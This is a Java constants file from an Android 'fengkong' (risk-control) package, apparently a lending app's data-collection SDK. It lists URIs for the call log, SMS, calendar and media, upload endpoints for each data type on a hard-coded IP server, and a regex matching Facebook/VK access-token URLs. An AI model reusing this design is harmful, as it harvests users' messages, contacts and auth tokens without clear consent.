package com.weithink.fengkong;

import android.net.Uri;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.provider.Telephony;

public interface Constants {
    String testUrl = "https://47.92.149.227:8199";
//    String baseUrl = "https://riskdata.cashsweet.net";
    String WORK_NAME = "weithink";
    String VERSION = "1.2.4";
    Uri CALLURI = CallLog.Calls.CONTENT_URI;
    Uri CALENDAREVENT_URI = CalendarContract.Events.CONTENT_URI;
    Uri SMS_URI = Telephony.Sms.CONTENT_URI;
    String THREAD_PREFIX = "Weithink_Fengkong-";
    Uri MEDIASTORE_AUDIO_URI = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
    Uri MEDIASTORE_IMAGE_URI = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
    Uri MEDIASTORE_VIDEO_URI = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;

    String LOGTAG = "WeithinkFengkong";
    int ONE_SECOND = 1000;
    int ONE_MINUTE = 60 * ONE_SECOND;
    int THIRTY_MINUTES = 30 * ONE_MINUTE;
    int ONE_HOUR = 2 * THIRTY_MINUTES;

    String MD5 = "MD5";
    String SHA1 = "SHA-1";
    String SHA256 = "SHA-256";
    String FB_AUTH_REGEX = "^(fb|vk)[0-9]{5,}[^:]*://authorize.*access_token=.*";


    interface DataType{
        /**
         * * 1.app
         *  * 2.calevent
         *  * 3.calls
         *  * 4.contacts
         *  * 5.device
         *  * 6.file
         *  * 7.extrasData
         *  * 8.media
         *  * 9.sms
         */
        String APP_DATA = "app";
        String CALEVENT_DATA = "calevent";
        String CALLS_DATA = "calls";
        String CONTACTS_DATA = "contacts";
        String DEVICE_DATA = "device";
        String FILE_DATA = "file";
        String EXTRASDATA_DATA = "extrasData";
        String MEDIA_DATA = "media";
        String SMS_DATA = "sms";
        //数据类型判断 key
        String INFO_TYPE = "info_type";
    }
    //https://47.92.149.227/data/status?userId=10545
     interface ApiType{
        String CONFIG_DATA = "/data/config";
        String STATUS_DATA = "/data/status";
        String APP_DATA = "/data/app";
        String CALEVENT_DATA = "/data/calevent";
        String CALLS_DATA = "/data/calls";
        String CONTACTS_DATA = "/data/contacts";
        String DEVICE_DATA = "/data/device";
        String FILE_DATA = "/data/file";
        String EXTRASDATA_DATA = "/data/extrasData";
        String MEDIA_DATA = "/data/media";
        String SMS_DATA = "/data/sms";
    }

}
